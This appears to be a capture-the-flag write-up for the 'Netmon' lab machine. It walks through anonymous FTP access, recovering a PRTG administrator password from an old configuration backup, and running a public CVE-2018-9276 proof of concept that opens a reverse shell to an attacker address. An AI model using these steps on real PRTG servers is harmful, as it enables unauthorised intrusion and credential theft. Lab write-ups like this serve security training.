@@ -1,0 +1,82 @@
+# Netmon Write-Up
+
+Easy
+
+Tags:
+`FTP`
+`PRTG Network Monitor`
+
+
+## Intro
+
+1. Use ftp anonymous to get user flag
+2. Find username and password of Administrator from backup file
+3. Exploit cve-2018-9276
+
+## Exploit
+
+### Port scanning
+
+```
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-03-19  12:18AM                 1024 .rnd
+| 02-25-19  10:15PM       <DIR>          inetpub
+| 07-16-16  09:18AM       <DIR>          PerfLogs
+| 02-25-19  10:56PM       <DIR>          Program Files
+| 02-03-19  12:28AM       <DIR>          Program Files (x86)
+| 02-03-19  08:08AM       <DIR>          Users
+|_02-25-19  11:49PM       <DIR>          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+```
+
+### Use ftp anonymous to get user flag
+
+## Privilege Escalation
+
+Find version of prtg in page source
+```
+prtgversion=18.1.37.13946
+```
+
+Search vulnerability => [PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46527)
+
+PoC: [cve-2018-9276 github](https://github.com/wildkindcc/CVE-2018-9276)
+
+```
+optional arguments:
+  -h, --help            show this help message and exit
+  -i HOST, --host HOST  IP address / Hostname of vulnerable PRTG server
+  -p PORT, --port PORT  Port number
+  --lhost LHOST         LHOST for MSFVENOM
+  --lport LPORT         LPORT for MSFVENOM
+  --user USER           Administrator Username
+  --password PASSWORD   Administrator Password
+  --https               Negotiate SSL connection to the server (Requires
+                        socket to be compiled with SSL support)
+```
+
+Find username and password of Administrator
+
+Get `PRTG Configuration.old.bak` file in `/ProgramData/Paessler/prtg network monitor` via ftp
+
+```
+<dbpassword>
+    <!-- User: prtgadmin -->
+    PrTg@dmin2018
+</dbpassword>
+```
+
+`PrTg@dmin2018` is old password!
+
+Run PoC with Sudo
+
+```
+sudo python CVE-2018-9276.py -i 10.10.10.152 -p 80 --lhost 10.10.16.5 --lport 4444 --user prtgadmin --password PrTg@dmin2019
+```
